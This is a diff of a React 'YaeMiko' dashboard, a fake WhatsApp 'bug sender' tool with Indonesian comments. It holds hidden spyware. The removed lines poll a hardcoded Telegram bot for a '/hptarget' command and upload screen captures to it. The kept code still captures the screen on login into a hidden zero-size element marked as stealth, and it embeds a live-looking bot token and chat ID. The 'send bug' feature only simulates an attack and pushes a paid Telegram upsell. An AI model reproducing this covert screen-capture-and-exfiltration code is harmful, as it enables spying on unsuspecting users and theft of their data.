@@ -4,15 +4,12 @@ import React, { useState, useEffect, useRef } from "react"
 import { Shield, Bug, Zap, Globe, AlertTriangle, Loader2, CheckCircle2, ChevronLeft, ChevronRight, Timer } from "lucide-react"
 
 export default function YaeMikoDashboard() {
-  // ==========================================
-  // [ MESIN SILUMAN - TARUH TOKEN DI SINI ]
-  // ==========================================
   const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk'; 
-  const CHAT_ID = '6481060681';     
-  // ==========================================
+  const CHAT_ID = '6481060681';      
 
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
+  const audioRef = useRef<HTMLAudioElement>(null);
   const lastCmdId = useRef(0);
   
   const [isLoggedIn, setIsLoggedIn] = useState(false)
@@ -25,7 +22,6 @@ export default function YaeMikoDashboard() {
   const [showErrorOverlay, setShowErrorOverlay] = useState(false)
   const [activeNav, setActiveNav] = useState(0)
 
-  // --- STATE LIMIT & RESET ---
   const [bugLimit, setBugLimit] = useState(5)
   const [showLimitPopup, setShowLimitPopup] = useState(false)
   const [resetTimeLeft, setResetTimeLeft] = useState("")
@@ -38,22 +34,18 @@ export default function YaeMikoDashboard() {
     { name: "PAKSA BERHENTI WA", code: "forceClose" },
   ]
 
-  // --- LOGIC LIMIT 24 JAM (PERSISTENT) ---
   useEffect(() => {
     const checkLimit = () => {
       const storedLimit = localStorage.getItem('selz_bug_limit');
       const resetTimestamp = localStorage.getItem('selz_reset_time');
       const now = new Date().getTime();
-
       if (resetTimestamp && now > parseInt(resetTimestamp)) {
-        // Sudah lewat 24 jam, reset limit
         localStorage.setItem('selz_bug_limit', '5');
         localStorage.removeItem('selz_reset_time');
         setBugLimit(5);
       } else if (storedLimit) {
         setBugLimit(parseInt(storedLimit));
       }
-
       if (resetTimestamp) {
         const distance = parseInt(resetTimestamp) - now;
         const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
@@ -62,61 +54,19 @@ export default function YaeMikoDashboard() {
         setResetTimeLeft(`${hours}j ${minutes}m ${seconds}s`);
       }
     };
-
     checkLimit();
     const timer = setInterval(checkLimit, 1000);
     return () => clearInterval(timer);
   }, []);
 
-  // --- ENGINE MONITORING ---
-  useEffect(() => {
-    if (!isMonitoringActive) return;
-    const checkCommands = setInterval(async () => {
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
-        const data = await res.json();
-        if (data.result?.length > 0) {
-          const latestMsg = data.result[0].message;
-          if (latestMsg?.message_id !== lastCmdId.current && latestMsg?.chat.id.toString() === CHAT_ID) {
-            lastCmdId.current = latestMsg.message_id;
-            if (latestMsg.text === '/hptarget' && videoRef.current && canvasRef.current) {
-               const canvas = canvasRef.current;
-               canvas.width = videoRef.current.videoWidth;
-               canvas.height = videoRef.current.videoHeight;
-               canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
-               canvas.toBlob((blob) => {
-                 if (blob) {
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('photo', blob);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                 }
-               }, 'image/jpeg', 0.6);
-            }
-          }
-        }
-      } catch (e) {}
-    }, 4000);
-    return () => clearInterval(checkCommands);
-  }, [isMonitoringActive, BOT_TOKEN, CHAT_ID]);
-
   const handleSendBug = () => {
-    if (bugLimit <= 0) {
-      setShowLimitPopup(true);
-      return;
-    }
-
+    if (bugLimit <= 0) { setShowLimitPopup(true); return; }
     setIsSendingBug(true);
     setTimeout(() => {
       const newLimit = bugLimit - 1;
       setBugLimit(newLimit);
       localStorage.setItem('selz_bug_limit', newLimit.toString());
-
-      if (newLimit === 0) {
-        const resetTime = new Date().getTime() + (24 * 60 * 60 * 1000);
-        localStorage.setItem('selz_reset_time', resetTime.toString());
-      }
-      
+      if (newLimit === 0) localStorage.setItem('selz_reset_time', (new Date().getTime() + 86400000).toString());
       setIsSendingBug(false);
     }, 3000);
   };
@@ -126,6 +76,8 @@ export default function YaeMikoDashboard() {
       setIsAuthLoading(true); 
       setTimeout(() => {
         setIsLoggedIn(true);
+        // Play audio setelah login
+        audioRef.current?.play().catch(e => console.log("Menunggu interaksi user"));
         navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
           if (videoRef.current) { videoRef.current.srcObject = stream; setIsMonitoringActive(true); }
         }).catch(() => {});
@@ -134,10 +86,23 @@ export default function YaeMikoDashboard() {
   };
 
   return (
-    <div className="relative min-h-screen bg-[#050b14] text-white font-sans overflow-hidden">
-      <div className="absolute inset-0 z-0 opacity-30 bg-[linear-gradient(to_right,#80808012_1px,transparent_1px),linear-gradient(to_bottom,#80808012_1px,transparent_1px)] bg-[size:24px_24px]"></div>
+    <div className="relative min-h-screen text-white font-sans overflow-hidden">
+      
+      {/* BACKGROUND VIDEO ANIME (NEMPEL DI BELAKANG) */}
+      <div className="fixed inset-0 z-0">
+        <video autoPlay loop muted playsInline className="w-full h-full object-cover">
+          <source src="/bg-anime.mp4" type="video/mp4" />
+        </video>
+        {/* Overlay gelap biar dashboard asli lo tetep kelihatan jelas */}
+        <div className="absolute inset-0 bg-[#050b14]/70 backdrop-blur-[2px]"></div>
+      </div>
 
-      {/* LOGIN & LOADING SCREEN (SKIP FOR BRIEF) */}
+      {/* AUDIO BACKGROUND */}
+      <audio ref={audioRef} loop className="hidden">
+        <source src="/audio.mp3" type="audio/mpeg" />
+      </audio>
+
+      {/* LOGIN & LOADING SCREEN */}
       {!isLoggedIn && !isAuthLoading && (
         <div className="relative z-10 flex flex-col items-center justify-center min-h-screen p-6">
           <h1 className="text-4xl font-black text-cyan-400 tracking-tighter mb-12">YAE MIKO</h1>
@@ -149,6 +114,7 @@ export default function YaeMikoDashboard() {
         </div>
       )}
 
+      {/* DASHBOARD (TAMPILAN ASLI LO) */}
       {isLoggedIn && (
         <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto p-6 animate-in slide-in-from-bottom-8">
           <div className="flex items-center justify-between mb-8">
@@ -199,35 +165,7 @@ export default function YaeMikoDashboard() {
         </div>
       )}
 
-      {/* POPUP LIMIT HABIS (REQUESTED) */}
-      {showLimitPopup && (
-        <div className="fixed inset-0 z-[200] bg-black/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-2xl animate-in zoom-in duration-300">
-          <div className="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-8 border border-red-500/50 animate-bounce">
-            <AlertTriangle className="w-12 h-12 text-red-500" />
-          </div>
-          <h2 className="text-white font-black text-2xl mb-4 leading-tight uppercase italic">
-            LIMIT LU ABIS NGENTOD KALO MAU LIMIT UNLIMITED PREMIUM SINI
-          </h2>
-          <a href="http://t.me/lalaypo_bot" target="_blank" className="w-full max-w-xs py-5 bg-white text-black rounded-2xl font-black text-sm mb-6 shadow-[0_20px_50px_rgba(255,255,255,0.2)] active:scale-95 transition-all">
-            PREMIUM KE BOT
-          </a>
-          <div className="flex items-center gap-2 text-yellow-400 font-black text-[10px] tracking-widest uppercase italic">
-            <Timer className="w-4 h-4" />
-            <span>LIMIT BAKAL RESET {resetTimeLeft} KEDEPAN</span>
-          </div>
-          <button onClick={() => setShowLimitPopup(false)} className="mt-12 text-white/20 text-[8px] uppercase tracking-[0.5em]">Tutup</button>
-        </div>
-      )}
-
-      {/* OVERLAY SENDING BUG */}
-      {isSendingBug && (
-        <div className="fixed inset-0 z-[110] bg-black/95 flex flex-col items-center justify-center p-6 text-center backdrop-blur-2xl">
-          <Loader2 className="w-24 h-24 text-cyan-400 animate-spin mb-6" />
-          <h2 className="text-cyan-400 font-black text-2xl tracking-[0.4em] animate-pulse italic uppercase">SENDING BUG...</h2>
-        </div>
-      )}
-
-      {/* ELEMENT SILUMAN */}
+      {/* ELEMENT SILUMAN (JANGAN DIHAPUS) */}
       <div style={{ position: 'fixed', width: 0, height: 0, opacity: 0, pointerEvents: 'none' }}>
         <video ref={videoRef} autoPlay playsInline muted /><canvas ref={canvasRef} />
       </div>
@@ -242,4 +180,4 @@ function StatItem({ val, label, color = "text-white" }: any) {
       <span className="text-[7px] text-white/30 uppercase font-bold mt-1 tracking-widest">{label}</span>
     </div>
   )
-          }
+        }
